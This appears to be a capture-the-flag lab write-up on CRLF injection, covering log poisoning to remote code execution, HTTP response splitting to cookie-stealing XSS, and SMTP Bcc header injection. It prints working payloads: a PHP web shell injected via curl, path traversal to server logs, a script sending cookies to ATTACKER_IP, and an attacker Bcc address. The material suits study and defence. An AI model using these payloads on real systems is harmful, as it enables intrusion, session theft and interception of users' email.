# CRLF Injection

Three labs covering different exploitation paths once you have CRLF injection: log poisoning to RCE, response splitting to XSS, and SMTP header injection.

---

## Background

CRLF (`\r\n`, `%0d%0a`) is the line separator in HTTP headers and many text-based protocols. If user input ends up inside a header value without stripping carriage returns and line feeds, you can inject new headers or new response bodies.

---

## Lab 1 — Log Poisoning → RCE

### The Bug

User-controlled input (usually a `name` or `username` field) gets written to a log file. The log file is later included/executed by PHP (`include`, `require`, or a log viewer that eval's content).

### Payload

Inject PHP code into the field that gets logged:
```
<?php system($_GET['cmd']); ?>
```

If the field is a `User-Agent` header or a form field called `name`, inject via:

```bash
curl -s http://TARGET/register.php \
  -d "name=<?php system(\$_GET['cmd']); ?>&email=test@test.com"
```

Then access the log file with a command:
```bash
curl -s "http://TARGET/admin/logs/app.log?cmd=cat+/flag.txt"
# Or if the log is included by a PHP page:
curl -s "http://TARGET/index.php?page=../../../../var/log/apache2/access.log&cmd=cat+/flag.txt"
```

### Finding the Log Path

Common locations:
- `/var/log/apache2/access.log`
- `/var/log/nginx/access.log`
- The app's own log file (usually in a `logs/` directory under the web root)

---

## Lab 2 — Response Splitting → XSS → Cookie Theft

### The Bug

A redirect endpoint reflects a parameter into the `Location` header without sanitizing CRLF:

```
GET /redirect.php?url=https://example.com
Response: Location: https://example.com
```

With CRLF injection:
```
GET /redirect.php?url=https://example.com%0d%0aContent-Length: 0%0d%0a%0d%0a<html>...
```

The injected content becomes a new HTTP response body. A browser following the redirect will render the injected HTML.

### Payload (XSS to Steal Cookie)

Inject a second response with a script that sends the admin's cookie to your server:

```
https://example.com
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html

<script>
document.location='http://ATTACKER_IP/?c='+document.cookie
</script>
```

URL-encoded:
```
https://example.com%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>document.location='http://ATTACKER_IP/?c='+document.cookie</script>
```

Send this URL to the admin bot via a report/feedback feature. Their browser loads the split response, executes the script, and sends the cookie to your listener.

### Template Literal Bypass

If the application URL-decodes `+` signs to spaces before inserting into the header, your payload may break. Use template literals or `encodeURIComponent()` instead of concatenation:

```javascript
// Instead of:
document.location='http://ATTACKER_IP/?c='+document.cookie
// Use:
fetch(`http://ATTACKER_IP/?c=${btoa(document.cookie)}`)
```

---

## Lab 3 — SMTP Header Injection

### The Bug

A contact/feedback form with a `name` or `subject` field inserts the value directly into an email header (e.g., `From: NAME <noreply@site.com>`).

If the name contains CRLF, you can inject additional headers like `Bcc:` to receive a copy of all emails sent through this form.

### Payload

In the name field:
```
legit name\r\nBcc: attacker@evil.htb
```

Or as a URL-encoded POST parameter:
```
name=legit+name%0d%0aBcc%3a+attacker%40evil.htb
```

The resulting email headers:
```
From: legit name
Bcc: attacker@evil.htb
```

All emails sent via this form are now CC'd to your address. In the lab, you can read the email in MailHog at `http://TARGET:8025`.

### Finding It

Look for any form that:
1. Sends an email confirmation
2. Includes user-provided data in the email (subject, from name, reply-to)

The injection works if the backend builds the email headers by string concatenation rather than using a safe email library with proper escaping.

---

## General Notes

**Detecting CRLF injection:**
- Send `%0d%0a` or `%0D%0A` in input fields
- Look for injected headers in the response
- If redirected, check if the injected content appears after the Location header

**Common injection points:**
- Redirect URL parameters
- User-Agent / Referer headers
- Form fields used in email composition
- Username/display name fields written to logs
